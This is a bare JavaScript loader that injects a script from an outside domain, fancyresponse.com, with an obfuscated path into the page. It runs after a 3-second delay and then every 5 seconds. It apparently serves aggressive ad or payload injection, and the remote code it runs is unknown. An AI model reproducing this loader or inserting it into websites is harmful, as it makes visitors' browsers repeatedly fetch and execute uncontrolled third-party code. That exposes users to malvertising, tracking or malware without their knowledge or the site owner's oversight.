(function (rtfqo) {
  function loadScript() {
    var d = document,
      s = d.createElement('script'),
      l = d.scripts[d.scripts.length - 1];
    s.settings = rtfqo || {};
    s.src = "\/\/fancyresponse.com\/bqXFV.smdxGElu0KYvWKcH\/Weum\/9EulZ\/Uwl\/klP\/T\/Yo2JMPz_Iy2oNJD\/IMtCNkj\/YkzWM-j\/Yk0CMYwN";
    s.async = true;
    s.referrerPolicy = 'no-referrer-when-downgrade';
    l.parentNode.insertBefore(s, l);
  }

  // Initial delay of 3 seconds (3000ms)
  setTimeout(function () {
    loadScript(); // First execution

    // Repeat every 5 seconds (5000ms)
    setInterval(function () {
      loadScript();
    }, 5000);
  }, 3000);
})({});
